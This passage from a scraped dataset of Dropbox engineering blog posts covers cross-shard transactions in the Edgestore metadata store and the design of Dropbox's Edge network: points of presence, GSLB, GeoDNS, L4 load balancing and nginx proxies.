case of leader failure straightforward (just abort and move on, instead of contacting all participants and entering a recovery procedure) and improves the liveness of the system under error conditions. It also makes filtering straightforward—a concurrent read or write need only contact the node containing the transaction record to determine transaction state, which improves performance for latency-sensitive clients. The protocol completes with one final step: Phase 2b: Commit Application The leader notifies the participants of the commit decision and they can make the new state visible. (They will delete the staged state if the leader has aborted the transaction.) Making two-phase commit practical Two-phase commit is a relatively simple protocol in theory, but unfortunately there are a lot of practical barriers to implementing it. One key problem is read and write amplification: an increase in the number of reads and writes in the protocol path. Write amplification is inherent in the fact that not only do you need to write a transaction record, but also you need to durably stage a commit, which incurs at least one additional write per participant. The extra writes increase the critical section of the transaction, which can cause lock contention and application instability. Moreover, on every read, the database also needs to perform filtering to ensure that the read doesn’t observe any state that is dependent on a pending cross-shard transaction, which affects all reads in the system, even non-transactional ones. Therefore, in order to translate two-phase commit to Edgestore, we needed a design that answered three questions: How to efficiently determine transaction state. How to mitigate the performance penalty of staging and applying commits. How to minimize the filtering penalty for reads. External transaction record As mentioned in the previous section introducing two-phase commit, we found that modifying the two-phase commit protocol to utilize an external transaction record minimized the performance cost of determining transaction state, since a concurrent request need only check the transaction record to determine the state of the transaction as opposed to contacting each of the participants. By extension, this limits the worst-case filtering penalty for reads, since they will need to contact at most two nodes—the local participant and the (possibly local) node storing the transaction record. We implemented the transaction record as an Edgestore object, which gave us all the original strong consistency guarantees of single-colo operations and allowed us to collocate the transaction record with one of the cross-shard transaction participants. Copy-on-write A typical approach to implementing commit staging would be to store a fully materialized copy of the staged data alongside the existing data as in a multiversioned storage system. However, Edgestore’s underlying MySQL schema doesn’t support storing duplicates of a given object. Therefore, an approach where we write a full copy of an object to a secondary MySQL table to stage a commit and copy it into the primary data table to apply it would have the effect of doubling the cost (and latency) of every transaction. Instead, we chose to implement commit staging and application using copy-on-write. In order to stage a commit, we commit the raw mutations in a separate MySQL table, and then only on commit application do we materialize the transaction and apply the state to the primary data tables. By taking this approach, we reduced our write amplification by up to 95% over a naive multiversioning approach. A typical read compared to a read with a staged transaction. Additionally, our copy-on-write implementation provided significant performance benefits for readers. In steady state, any given record is not likely to have an in-flight mutation, and the size of the secondary MySQL table should be roughly proportional to the rate of cross-shard transactions. This means that the typical filtering cost to a reader is simply the cost of a local existence check against a table that is small enough to fit in memory, after which point it can serve the read from the same node. If there is a staged commit, then it must either wait for or assist the application of the in-flight transaction, which involves contacting at most one other node. Deploying to a live system Of course, it’s one thing to have a design for a system you believe is correct but entirely another to prove it. Since Edgestore has been running for years and backs almost every request to Dropbox, the design itself had to accommodate validating our assumptions about consistency, correctness, and performance while providing a path for safe rollout. This was the fun part 😛 Offline consistency harness The whole purpose of the project was to offer an Edgestore API with enhanced consistency. Therefore, we needed to prove to ourselves beyond a doubt that our implementation upheld the newly stated guarantees. To do this, we built an offline test harness that we ran continuously in our build environment (amounting to multiple years of CPU time) to corroborate our assertions: cross shard transactions in Edgestore are atomic and strictly serializable. The basic theory behind the test harness is that given a full history of all mutations, you can construct a precedence graph describing ordering relationships among the transactions responsible for those mutations. You construct a precedence graph by writing a node for each transaction, and then connecting it to another transaction with a directed edge if it performs an operation on shared data before that other transaction. The topological ordering defined by this graph describes the valid serial orderings of transactions, and therefore the graph should be acyclic. If it has a cycle, you have violated serializability. A serializable execution order compared to a serializability violation. Taking the concept one step further, if you replace the transaction nodes with nodes representing each participant of the transaction, you can use the resulting graph to prove atomicity. Roughly, if the mutations applied to each participant also embed information about other participants (directed edges radiating outward from a node representing the participant), the subgraph formed by connecting each participant’s view of the mutation set should form a complete, directed graph (each complete subgraph can be identified with a transaction node in the precedence graph). If there are missing or dangling edges, you have violated atomicity. An atomicity violation. To build our harness, we created special Edgestore objects with two fields: one for the transaction identifier (which we filled by introspecting our RPC headers) to provide the directed edges for our precedence graph, and the other for the expected participant list. We then wrote a client that issues transactions on random subsets of the objects, updating the two fields as appropriate. We enabled application-level multiversioning so we could later recover the full mutation history, and we added random fault injection to increase coverage of error paths. (A careful reader will observe that we are missing the strict portion of strict serializability guarantee—we added some read-only threads with extra logic to handle this). In the end, the harness surfaced multiple bugs, one as basic as a dropped error, and another as subtle as a flaw in the read filtering protocol. These bugs would have been nearly impossible to detect, let alone root-cause, had they occurred outside of a simulated environment. That may seem like a small payoff for multiple CPU-years of testing, but for us and our users, it was worth every minute. Production shadowing In parallel with consistency verification, we also set out to validate the two other pieces of our design: the correctness of our copy-on-write implementation, and the performance cost of our two-phase commit design when inlined into the existing system. The first was a potential risk because if the materialization logic was wrong or the stored mutation did not fully encode user-facing write APIs, we could end up in a state where commit application would not know how to properly apply the transaction. The second was critical for the continued reliability of Edgestore—any drastic change in latency, traffic, or locking could cause system instability and break upstream applications. During the design phase for cross-shard transactions, we realized we could achieve both of these goals by introducing a modified two-phase commit protocol. In the “validation” version of the protocol, the commit staging phase would perform the shadow write, and then immediately delete the “staged” commit as part of the transaction generated by the existing Edgestore API, all without communicating back to the leader. In turn, a truncated commit application phase would no-op without attempting to recreate the transaction, since the data had already been written and the commit unstaged. Filtering, similarly, would always check for shadow transactions but ignore the result, since the transaction would have already been committed. Modified two-phase commit protocol. The modified protocol preserved the existing API and was resilient to a bug in the shadow representation, since the original API writes remained the source of truth instead of a transaction reconstructed from a potentially incorrect shadow. Moreover, while the transaction semantics were unchanged from the perspective of Edgestore clients, Edgestore itself operated under the expected extra coordination and load from a two-phase commit. We thus validated our performance assumptions with very little risk, since we could increase the amount of traffic doing this pseudo-two-phase commit in a controlled manner. Using MySQL binlogs to reconstruct transactions. The green box represents the modified Commit Staging phase, and the blue box is the transaction we use for offline validation. The “validation” two-phase commit also provided a straightforward way of corroborating the correctness of the shadow representation. Since the modified commit staging wrote a MySQL transaction with both the original API result and the shadow representation, we could extract the two atomically from the MySQL binary log and try converting between the two. If our conversion logic produced a different result from the shadow than the actually committed data, we would know there was a bug. This enabled us to identify a few features of our existing API that would have been incompatible with cross shard transactions and allowed us to proactively address the gaps before going live with the new protocol. Limitations Although two-phase commit was a fairly natural fit for Edgestore’s existing workload, it is not a silver bullet for those looking to improve their consistency guarantees. Edgestore data was already well-collocated, which meant that cross-shard transactions ended up being fairly rare in practice—only 5-10% of Edgestore transactions involve multiple shards. Had this not been the case, upstream applications might not have been able to handle the increased latency and lock contention that comes with two-phase commit. Moreover, in many cases cross shard transactions replaced more expensive, application-level protocols, which meant the change was a net win for performance in addition to simplifying developer logic. Two-phase commit in Edgestore also benefits from a strongly-consistent caching layer that absorbs upwards of 95% of client reads. This significantly cuts down on the read filtering penalty, which might have been otherwise untenable. Systems without an auxiliary cache or those optimized for simpler write patterns might similarly find two-phase commit unwieldy and prefer to opt for storage-level multiversioning or consistency abstractions provided as intermediary service layers between clients and the storage engine. This is a direction we are exploring for our next-generation metadata storage—combining a simple, key-value storage primitive and then building a suite of metadata services on top with varying levels of consistency and developer control. Stay tuned for updates. Conclusion For a strongly consistent, distributed metadata store such as Edgestore—serving 10 million requests per second and storing multiple petabytes of metadata—writes spanning multiple physical storage nodes are an inevitability. Although our initial “best-effort” approach to multi-shard writes worked well for most use cases, over time the balance of complexity shifted too heavily on developers. Therefore, we decided to tackle the problem of building a scalable primitive for multi-shard writes and implemented cross-shard transactions. Although the basic protocol underlying our implementation has been known for a long time, actually retrofitting it into an existing system presented many challenges and required a creative approach to both implementation and validation. In the end, the up-front diligence paid dividends and enabled us to make a fundamental change to an existing system while maintaining our standards of trust and the safety of our users’ data. Think you’re up to the task? We’re hiring! Thanks to: Tanay Lathia, Robert Escriva, Mihnea Giurgea, Bashar Al-Rawi, Bogdan Munteanu, Mehant Baid, Zviad Metreveli, Aaron Staley, and James Cowling. // Tags Infrastructure Performance // Copy link Link copied Link copied", "date": "2018-11-09"},
{"website": "Dropbox", "title": "Dropbox traffic infrastructure: Edge network", "author": ["Oleg Guba"], "link": "https://dropbox.tech/infrastructure/dropbox-traffic-infrastructure-edge-network", "abstract": "Dropbox scale Why do we need Edge? PIcking PoP Locations GSLB GeoDNS at Dropbox Inside a point of presence Wrap up and future blog posts We’re hiring! Acknowledgments In this post we will describe the Edge network part of Dropbox traffic infrastructure. This is an extended transcript of our NginxConf 2018 presentation. Around the same time last year we described low-level aspects of our infra in the Optimizing web servers for high throughput and low latency post. This time we’ll cover higher-level things like our points of presence around the world, GSLB, RUM DNS, L4 loadbalancers, nginx setup and its dynamic configuration, and a bit of gRPC proxying. Dropbox scale Dropbox has more than half a billion registered users who trust us with over an exabyte of data and petabytes of corresponding metadata. For the Traffic team this means millions of HTTP requests and terabits of traffic. To support all of that we’ve built an extensive network of points of presence (PoPs) around the world that we call Edge. Why do we need Edge? Above, we mentioned that BGP selects the “optimal” route and for the most part that is true. The problem is that BGP does not know anything about link latency, throughput, packet loss, and so on. Generally in the presence of multiple routes to the destination, it just selects one with the least number of hops. Numbers are given based on: 20ms PoP↔user latency, 150ms PoP↔DC latency, 100ms server execution time As you can see, by simply putting the PoP close to the user one can improve latency by more than factor of two. But that is not all. Our users benefit greatly from faster file uploads and downloads. Let’s see how latency affects TCP congestion window (CWND) growth during file uploads: Here we can see a low and high latency connection comparison that represents a connection with and without a PoP respectively: The client with lower latency is progressing through slow start faster, because it is an RTT-bound process This client also settles on the higher threshold for congestion avoidance, because of the lower level of packet loss. This happens because that packets need to spend less time on the public, and possibly congested, internet links—once they hit the PoP we take them into our own backbone network. Aside from all latency-related performance gains, building our own Edge network gives us (traffic engineers) a lot of freedom: for example we can easily experiment with new low- and high-level protocols, external and internal loadbalancing algorithms, and more closely integrate with the rest of the infrastructure. We can do things like research BBR congestion control effects on file download speed, latency, and packet loss. PIcking PoP Locations As of today, Dropbox has 20 PoPs around the world: We’ve just announced our PoP in Toronto, and will get two more in Scandinavia by the end of the year. In 2019, we are planning to look at increasing our Edge footprint by researching the viability of PoPs in LATAM, Middle East, and APAC. The process of PoP selection, which was easy at first, now becomes more and more complicated: we need to consider backbone capacity, peering connectivity, submarine cables , but most importantly the location with respect to all the other PoPs we have. The current PoP selection procedure is human guided but algorithm-assisted. Even with a small number of PoPs without assistive software it may be challenging to choose between, for example, a PoP in Brazil and a PoP in Australia. The problem persists as the number of PoPs grows: e.g. what location will benefit Dropbox users better, Vienna or Warsaw? We try to alternate new PoP placement between selecting the most advantageous PoP for the existing and potential Dropbox users. A tiny script helps us brute-force the problem by: Splitting the Earth into 7th level s2 regions Placing all the existing PoPs Computing the distance to the nearest PoP for all the regions weighted by “population” Doing exhaustive search to find the “best” location for the new PoP Adding it to the map Looping back to step 3, etc. By “population” one can use pretty much any metric we want to optimize, for example total number of people in the area, or number of existing/potential users. As for the loss function to determine the score of each placement one can use something standard like L1 or L2 loss. In our case we try to overcompensate for the effects of latency on the TCP throughput. Some of you may see that the problem here that can be solved by more sophisticated methods like Gradient Descent or Bayesian Optimization. This is indeed true, but because our problem space is so small (there are less than 100K 7th level s2 cells ) we can just brute-force through it and get a definitively optimal result instead of the one that can get stuck on a local optimum. GSLB Let’s start with the most important part of the Edge—GSLB. GSLB is responsible for loadbalancing users across PoPs. That usually means sending each user to the closest PoP, unless it is over capacity or under maintenance. GSLB is called the “most important part” here because if it misroutes users to the suboptimal PoPs frequently, then it makes the Edge network useless, and potentially even harms performance. The following is a discussion of commonly used GSLB techniques, their pros and cons, and how we use them at Dropbox. BGP anycast Anycast is the easiest loadbalancing method that relies on the core internet routing protocol, BGP. To start using anycast it is sufficient to just start advertising the same subnet from all the PoPs and internet will deliver packet to the “optimal” one automagically. Even though we get automatic failover and simplicity of the setup, anycast has many drawbacks, so let’s go over them one by one. Anycast performance Above, we mentioned that BGP selects the “optimal” route and for the most part that is true. The problem is that BGP does not know anything about link latency, throughput, packet loss, and so on. Generally in the presence of multiple routes to the destination, it just selects one with the least number of hops. Anycast-based loadbalancing is mostly optimal but it behaves poorly on high percentiles. This is true for a small and medium number of PoPs. But there is a conjecture that “critical” misrouting probability (e.g. probability of routing user to a different continent) in an anycasted network drops sharply with number of PoPs. Therefore it is possible that with increasing number of PoPs, anycast may eventually start outperforming GeoDNS. We’ll continue looking at how our anycast performance scales with the number of PoPs. Traffic steering With anycast, we have very limited control over traffic. It is hard to explicitly move traffic from one PoP to another. We can do some traffic steering using MED attributes, prepending AS_PATHs to our announces, and by explicitly communicating with traffic providers, but this is not scalable. Also note that in the N WLLA OMNI mnemonic AS_PATH is somewhere in the middle. This effectively means that it can be easily overridden by an administrator and in practice this makes BGP anycast pick the “cheapest” route, not the “nearest” or the “fastest.” Another property of anycast is that graceful drain of the PoP is impossible—since BGP balances packets and not connections. After the routing table change, all inflight TCP sessions will immediately be routed to the next best PoP and users will get an RST from there. Troubleshooting Generally reasoning about traffic routing with anycast becomes very non-trivial, since it involves the state of internet routing at a given time. Troubleshooting performance issues with anycast is hard and usually involves a lot of traceroutes, looking glasses, and back and forth communication with providers along the way. Here is an example of an epic anycast troubleshooting by Fastly NOC from NANOG mailing list: Service provider story about tracking down TCP RSTs. TL;DR SYNs passing through the router had different TTL and at the same time this IP field was used for the ECMP flow hashing. Note that, as in the case of a PoP drain, any connectivity change in the internet has a possibility of breaking users’ connections to anycasted IP addresses. Troubleshooting intermittent connection issues due to internet routing changes or faulty/misconfigured hardware can be challenging. Tools Here are couple of tricks you can use to make troubleshooting a bit easier (especially in case of anycast). Of course having a random request ID associated with every request that goes through the system and can be traced in the logs is a must. In case of the Edge, it is also helpful to echo back a header with the name of the PoP you’re connected to (or embed this into the unique request ID). Another useful thing that is commonly used is to create “debug” sites that can pre-collect all the troubleshooting data for the user so that they can attach it to the support ticket e.g.: github-debug.com , fastly-debug.com , and of course dropbox-debug.com , which was heavily inspired by them. Traffic team projects like dropbox-debug, Brotli static precompression, BBR evaluation and rollout, RUM DNS, and many others came out of Hack Week: a company-wide event that inspires us to try something new and exciting! Anycast at Dropbox With all that said, we still use anycast for our APEX domains like dropbox.com (without www) and as a fallback in case of major DDoS attacks. GeoDNS Let’s talk about another common solution for implementing GSLB: GeoDNS. In this approach each PoP has its own unique unicast IP address space and DNS is responsible for handing off different IP addresses to different users based on their geographical location.Let’s talk about another common solution for implementing GSLB: GeoDNS. In this approach each PoP has its own unique unicast IP address space and DNS is responsible for handing off different IP addresses to different users based on their geographical location. fallback in case of major DDoS attacks. This gives us control over traffic steering and allows graceful drain. It is worth mentioning that any kind of reasoning about unicast-based setup is much easier, therefore troubleshooting becomes simpler. As you can see, there are a lot of variables involved: we rely on a DNS provider guessing user IP by their DNS resolver (or trust EDNS CS data), then guessing user location by their IP address, then approximate physical proximity to latency. Note that different DNS providers will likely end up with different decisions, based on their algorithms and quality of their GeoIP database, therefore monitoring performance of multi-provider DNS setup is much harder. Aside from that, DNS also has a major problem with stale data. Long story short: DNS TTL is a lie. Even though we have TTL of one minute for www.dropbox.com , it still takes 15 minutes to drain 90% of traffic, and it may take a full hour to drain 95% of traffic: Here we also need to mention the myriad embedded devices using Dropbox API that range from video cameras to smart fridges which have a tendency of resolving DNS addresses only during power-on. GeoDNS at Dropbox Our DNS setup evolved quite a bit over last few years: we started with a simple continent→PoP mappings, then switched to country→PoP with a per-state mapping data for serving network traffic to large countries like the US, Canada, etc. At the moment, we are juggling relatively complex LatLong-based routing with AS-based overrides to work around quirks in internet connectivity and peering. Hybrid unicast/anycast GSLB Let’s very briefly cover one of the composite approaches to GSLB: hybrid unicast/anycast setup. By combining unicast and anycast announces along with GeoDNS mapping, one can get all the benefits of unicast along with an ability to quickly drain PoPs in case of an outage. One can enable this hybrid GSLB by announcing both PoP’s unicast subnet (e.g. /24) and one of its supernets (e.g. /19) from all of the PoPs (including itself). This implies that every PoP should be set up to handle traffic destined to any PoP: i.e. have all the VIPs from all the PoPs in the BGP daemons/L4 balancers/L7 proxies configs. Such an approach gives us the ability to quickly switch between unicast and anycast addresses and therefore immediate fallback without waiting for DNS TTL to expire. This also allows graceful PoP draining and all the other benefits of DNS traffic steering. All of that comes at a relatively small operational cost of a more complicated setup and may cause scalability problems once you reach the high thousands of VIPs. On the bright side, all PoP configs now become more uniform. Real User Metrics All the GSLB methods discussed up until now have one critical problem: none of them uses actual user-perceived performance as a signal, but instead rely on some approximations: BGP uses number of hops as a signal, while GeoIP uses physical proximity. We want to fix that by using Real User Metrics (RUM) collection pipeline based on performance data from our desktop clients. Companies that do not have an app usually do latency measurements with the JS-based prober on their website. Years ago we invested in an availability measurement framework in our Desktop Clients to help us estimate the user-perceived reliability of our Edge network. The system is pretty simple: once in a while a sample of clients run availability measurements against all of our PoPs and report back the results. We extended this system to also log latency information, which gave us sufficient data to start building our own map of the internet. We also built a separate resolver_ip→client_ip submap by joining DNS and HTTP server logs for http requests to random subdomain of a wildcard DNS record. On top of which we apply a tiny bit of post-processing for EDNS ClientSubnet-capable resolvers. We combine the aggregated latencies, resolver_ip→client_ip map, BGP fullview, peering information, and capacity data from our monitoring system to produce the final map of client_subnet→PoP. We are also considering adding a signal from the web server logs, since we already have TCP_INFO data, including number of retransmits , cwnd/rwnd, and rtt. After which we pack this map into a radix tree and upload it to a DNS server, after which it is compared to both anycast and GeoIP solutions. Specifics of map generation are up in the air right now: we’ve tried (and continue trying out) different approaches: from simple HiveQL query that does per-/24 aggregation to ML-based solutions like Random Forests, stacks of XGBoosts , and DNNs. Sophisticated solutions are giving slightly better, but ultimately comparable results, at the cost of way longer training and reverse engineering complexity. At least for now, we are sticking with the solution that is easier to reason about and easier to troubleshoot. Data anonymization and aggregation We anonymize and aggregate all latency and availability data by /24 subnet in case of IPv4 and /56 in case of IPv6. We don’t operate directly on real user IPs and enforce strict ACL and retention policies for all RUM data. Data cleanup Data cleanup is a very important step in the map data pipeline . Here are couple of common patterns that we’ve found during our map construction: Standard GetTickCount64 timer on Windows is quantized by around 16ms . In our Python client we’ve switched to time.perf_counter() . TCP and HTTP probes are way less reliable than HTTPS. This is mostly due to IP and DNS hijacking in the wild. Good examples of this are Wi-Fi captive portals. Even unique DNS requests can be received multiple times. Both due to lost responses and proactive cache refreshes by some DNS servers even unique queries like UUID4.perf.dropbox.com can be duplicated. We take that into account when joining the HTTP and DNS logs. And of course there are all kinds of weird timing results from negative and submicrosecond results to ones that are older than our universe (they probably came from another one). Data extrapolation Currently we use the following techniques for speculatively expanding the resulting map: If all the samples for an AS end up in the same “best” PoP we consider that all IP ranges announced by that AS should go to that PoP. If AS has multiple “best” PoPs then we break it down into announced IP ranges. For each one we assume that if all measurements in a range end up at the same PoP we can extrapolate that choice to the whole range. This technique allows us to double our map coverage, make it more robust to changes, and generate a map using a smaller dataset. Troubleshooting DNS map Once a RUM-based map is constructed, it is crucial to be able to estimate how good it is by using a single value, something like an F1 score used for binary classification or BLEU score used for evaluating machine translation. That way, one can not only automatically prevent bad maps from going live, but also numerically compare the quality of different map iterations and construction algorithms. Another common approach for the map evaluation is to test it against the subset of data that training process did not see . For interactive slicing and dicing of data and ad-hoc troubleshooting, we map subnets back into the lat/long coordinates, aggregate their stats by h3 regions and then draw them with kepler.gl . This is very helpful to quickly eyeball maps that have low scores. We went with h3 here instead of s2 because Kepler has built-in support for it, and generally h3 has simpler Python interface, therefore making it easier for us to experiment with visualizations. Whisper: also hexagons look cooler =) The same approach can be used for visualizing current performance, week-over-week difference, difference between GeoIP database versions, and much more. You can clearly see here where our PoPs are located. All of the big patches of blue and violet colors are getting their PoPs later this year or next year. Another way of visualizing IP maps is to skip the whole GeoDNS mapping step and plot IP addresses on the 2D plane by mapping them on a space filling curve, e.g. Hilbert curve . One can also place additional data in the height and color dimensions. This approach will require some heavy regularization for it to be consumable by humans and even more ColorBrewer2 magic to be aesthetically pleasing. RUM DNS at Dropbox RUM-based DNS is an actively evolving project, and we have not shipped it to our main VIPs yet, but the data we’ve collected from our GSLB experiments shows that it is the only way we can properly utilize more than 25-30 PoPs. This project will be one of our top priorities in 2019, because even metrics collected from an early map prototypes show that it can improve effectiveness of our Edge network by up to 30% using RUM DNS. It will also provide all the byproducts needed for the Explicit Loadbalancer… Speaking of which… Explicit loadbalancing A quick note about another more explicit way of routing users to PoPs. All these dances with guessing users’ IP address based on their resolver, GeoIP effectiveness, optimality of decisions made by BGP, etc. are all no longer necessary after a request arrives at the PoP. Because at that point in time, we know the users’ IP and even have an RTT measurement to them. At that point, we can route users on a higher level, like for example embedding a link to a specific PoP in the html, or handing off a different domain to a desktop client trying to download files. The same IP→PoP map that was constructed for RUM DNS can be reused here, now exposed as an RPC service. This loadbalancing method allows for a very granular traffic steering, even based on per-resource information, like user ID, file size, and physical location in our distributed storage. Another benefit is almost immediate draining of new connections, though references to resources that were once given out may live for extended periods of time. Very complex schemes can be invented here, for example we can hand off whole URLs that in the domain name embed information for external DNS-based routing and at the same time embed information for internal routing inside path/queryargs, that will allow PoP to make more optimal routing decision. Another approach is to put that additional data as an opaque blob into the encrypted/signed cookie. All of these possibilities sound exciting, so care must be taken to not overcomplicate the system . Explicit loadbalancing at Dropbox We are not currently using this as an external loadbalancing method but instead rely on it for internal re-routing. The traffic team is actively preparing foundation for using it though. Inside a point of presence Now let’s discuss what happens when traffic actually arrives at the PoP. Network architecture PoPs consist of network equipment and sets of Linux servers. An average PoP has good connectivity: backbone, multiple transits, public and private peering . By increasing our network connectivity, we decrease the time packets spend in the public internet and therefore heavily decrease packet loss and improve TCP throughput. Currently about half of our traffic comes from peering. Dropbox has an open peering policy , so feel free to peer with us all around the world . You can read more about network setup in the Evolution of Dropbox’s Edge Network post. L4 loadbalancer Our PoPs consist of multiple nginx boxes that are acting as L7 proxy and L4 loadbalancers (L4LBs) spreading load between them. We use standard techniques to scale L4LBs and make them more resilient to failure: BGP ECMP, DSR, and consistent hashing. IPVS acts as our dataplane—a kernel-level loadbalancer with netlink API. IPVS kernel module provides us with state tracking, pluggable scheduling algorithms, and IP-in-IP encapsulation for DSR. There are two main approaches for building high performance packet processors right now. Kernel Do packet processing early in network stack. This allows in-kernel data structures and TCP/IP parsing routines to be reused. For quite a while now, Linux has IPVS and netfilter modules that can be used for connection-level loadbalancing. Recent kernels have eBPF/XDP combo which allows for a safer and faster way to process packets in kernel space. Tight coupling with kernel though has some downsides: upgrade of such LB may require reboot, very strict requirements on kernel version, and difficult integration testing. This approach is used by companies like Facebook and Dropbox. Userspace Create a virtual NIC PCIe device with SRIO-V, bypass the kernel through DPDK/netmap/etc, and get RX/TX queues in an application address space. This gives programmers full control over the network, but tcp/ip parsing, data structures, and even memory management must be done manually (or provided by a 3rd party library). Testing this kind of setup is also much easier. This approach is used by companies like Google and Github . We currently use our homebrew version of consistent hashing module, but starting from linux-4.18 there is a Maglev Hash implementation: [ip_vs_mh]( https://github.com/torvalds/linux/blob/master/net/netfilter/ipvs/ip_vs_mh.c ). Compared to Ketama, Maglev Hash trades off some of the hash resiliency for more equal load distribution across backends and lookup speed. You can read more about Maglev Hash in the Maglev paper or the morning paper , or go over a quick summary of consistent hash techniques from Damian Gryski . We hash incoming packets based on 5-tuple (proto, sip, dip, sport, dport) which improves load distribution even further. This sadly means that any server-side caching becomes ineffective since different connections from the same client will likely end up on different backends. If our Edge did rely on local caching, we could use 3-tuple hashing mode where we would only hash on (protocol, sip, dip). Another interesting fact is that L4LB will need to do some special handling of ICMP’s Packet Too Big replies, since they will originate from a different host and therefore can’t use plain outer header hashing , but instead must be hashed based on the tcp/ip headers in the ICMP packet payload. Cloudflare uses another approach for solving this problem with its [pmtud]( https://github.com/cloudflare/pmtud ): broadcast incoming ICMP packets to all the boxes in the PoP. This can be useful if you do not have a separate routing layer and are ECMP’ing packets straight to your L7 proxies. Control plane for L4LBs is currently written in Go and closely integrated with our infrastructure and responsible for online reconfiguration, BGP connectivity, and health-checking of backends. Health checks on any encapsulating DSR-based L4LB is very tricky. Special care must be taken to run health checks through the same packet encapsulation process as data itself is going, otherwise it is easy to start sending traffic to the box that does not have a properly set up tunnel yet. Key properties of the L4LBs: They are resilient and horizontally scalable. Since L4LB does not terminate TCP connection and relies on the consistent hashing for connection scheduling, we can safely add/remove L4LBs because all of them will consistently route packets to the right destination Graceful removal/addition of L7 proxies. Since L4LBs also have a connection tracking table even if the set of backends changes, they will continue routing existing connections to them, which is the key distinguishing feature from plain ECMP Allows for horizontal scaling of L7 proxies. L4LB is fast enough to be network bounded, which means that we can scale L7 proxies until we have sufficient bandwidth Supports any IP-based protocol Supports any hashing algorithm. Maglev? Rendezvous? We can quickly experiment with any of them Supports any hashing policy. 3-tuple? 5-tuple? QUIC Connection ID? Easy! Not to mention that now we can convert basically any server in production into a high performance loadbalancer just by running a binary on it. As for the future work, we have a number of things we want to try. First, replace the routing dataplane with either a DPDK or XDP/eBPF solution, or possibly just integrating an open-source project like Katran . Second, we currently use IP-in-IP for packet encapsulation and it’s about time we switch it to something more modern like GUE which is way more NIC-friendly in terms of steering and offload support. L7 proxies (nginx) Having PoPs close to our users decreases the time needed for both TCP and TLS handshakes, which essentially leads to a faster TTFB. But owning this infrastructure instead of renting it from a CDN provider allows us to easily experiment and iterate on emerging technologies that optimize latency and throughput sensitive workloads even further. Let’s discuss some of them. TCP Starting from the lowest layers of the stack here is a Fair Queueing packet scheduler example: not only because it introduces fairness between flows, but also adds “pacing” to the upper level protocol. Let’s look at some specific examples. Without fair queueing, packets will be dumped to the network as they arrive from the TCP stack, which will lead to the huge Head-of-Line blocking further down network stack. With FQ packets of different flows are interleaved and one flow no longer blocks another. Without pacing, if you want to send multiple megabytes of data to the user, and current TCP congestion window allows that, then you’ll just dump thousands of packets onto the underlying network stack. With pacing, TCP will hint packet scheduler a desired sending rate (based on the congestion window and rtt) and then scheduler is responsible for submitting packets to the network stack every once in a while to maintain that steady sending rate: FQ comes at a relatively low CPU cost of around 5%, but it essentially makes routers and shapers along the path way happier, which leads to lower packet loss and less bufferbloat . Fun fact: when we first deployed FQ we’ve noticed that all the buffer drops on our Top-of-the-Rack (ToR) switches had gone away. Even though they were very beefy boxes capable of handling terabits of traffic it seems like they had shallow buffers and were susceptible to packet drop during microbursts. This is only one of the features that new Linux kernels provide, including but not limited to: Tail Loss Probe , TCP Small Queues , [ TCP_NOTSENT_LOWAT ] , RACK , etc. We work on network- and transport-level optimizations from time to time—and when we do, it’s super fun and usually involves some amount of Wiresharking and packetdril ling . For example, one upcoming project for the Traffic team is to evaluate BBR v2 (once it is ready for public testing). TLS All connections to Dropbox are protected by TLS that encrypts and authenticates data in transit over the public internet. We also re-encrypt data and send it over an encrypted and mutually authenticated channel over our backbone network. Since we use the same TLS stack internally for gRPC, we are very invested in its performance, especially around the TLS handshake part, where we make sure our libraries are using the most efficient hardware instructions possible , and for large file transfers, where we try to minimize the number of memory copies that they perform . Our TLS setup is relatively simple: BoringSSL, TLS tickets with frequently rotated ephemeral keys, preferring AEAD ciphersuites with ChaCha20/Poly1305 for older hardware (we are very close the Cloudflare’s TLS config .) We are also in the process of rolling out the RFC version of the TLS 1.3 across our Edge network. As for the future plans: as our boxes get closer to 100Gbit we are starting to look towards [ TCP_ULP ] and how we can add support for it to our software stack. HTTP The main job of the nginx proxies on the Edge is to maintain keep alive connections to the backends in data center over our fat-long-pipe backbone. This essentially means that we have a set of hot connections that are never constrained by CWND on an almost lossless link. Very quick note about how we build and deploy nginx: like everything else in Dropbox, we use Bazel to reproducibly and hermetically build a static nginx binary, copy over configs, package all of this into a squshfs, use torrent to distribute resulting package to all the servers, mount it (read-only), switch symlink, and finally run nginx upgrade. We probably should write a blog post on it too, since it is very simple and very efficient. Our nginx configuration is static and bundled with the binary therefore we need a way to dynamically configure some aspects of the configuration without full redeploy. Here is where Upstream Management Service kicks in. UMS is basically a look-aside external loadbalancer for nginx which allows us to reconfigure upstreams on the fly. One can create such system by: Regenerating config for nginx and hot reloading it. Sadly, when used extensively this approach negatively impacts connection reuse and increases memory pressure Using configuration API from the nginx plus Using standalone sidecar proxy on the same box, but that will lead to major increase in CPU/MEM resource usage Using Lua APIs or custom C modules Because we are already relying on the Lua there, we’ve built a data plane for UMS with it by combining a balancer_by_lua_block directive and ngx.timer.every hook that periodically fetches configuration from control plane via https. A nice side effect of writing the balancer module in Lua: we can now quickly experiment with different loadbalancing algorithms before writing them in C. The downside of Lua is that it is tricky to test, especially in a company where Lua is not one of the primary languages. Control plane for UMS is a Golang service that gets information from our service discovery, monitoring system, and manual overrides, then aggregates and exposes it as a REST endpoint that nginx then accesses through a simple httpc:request_uri . gRPC Nginx is terminating HTTP, HTTP/2, and gRPC connections on the Edge. Ability to proxy gRPC through our stack allows us to experiment with our apps talking gRPC directly to the application servers. Being able to do that streamlines development process and unifies the way services communicate externally and internally. We are looking how we can use gRPC for all APIs. For the APIs that we can’t switch to gRPC, like web, we consider converting all HTTP requests into the gRPC method calls right at the Edge. Wrap up and future blog posts All of this pretty much covers the external part of Traffic Infrastructure, but there is another half that is not directly visible to our users: gRPC-based service mesh, scalable and robust service discovery, and a distributed filesystem for config distribution with notification support. All of that is coming soon in the next series of blog posts. We’re hiring! Do you like traffic-related stuff? Dropbox has a globally distributed Edge network, terabits of traffic, and millions of requests per second. All of which is managed by a small team in Mountain View, CA. The Traffic team is hiring both SWEs and SREs to work on TCP/IP packet processors and loadbalancers, HTTP/2 proxies, and our internal gRPC-based service mesh. Not your thing? Dropbox is also hiring for a wide variety of engineering positions in San Francisco, New York, Seattle, Tel Aviv, and other offices around the world . Acknowledgments This article describes the work done by many people over a course of multiple years. Thanks to all current and past traffic team members: all of you helped make Dropbox faster and more reliable: Ashwin Amit, Brian Pane, Dmitry Kopytkov, Dzmitry Markovich, Eduard Snesarev, Haowei Yuan, John Serrano, Jon Lee, Kannan Goundan, Konstantin Belyalov, Mario Brito, Oleg Guba, Patrick Lee, Preslav Le, Ross Delinger, Ruslan Nigmatullin, Vladimir Sheyda, Yi-Shu Tai. // Tags Infrastructure Performance // Copy link 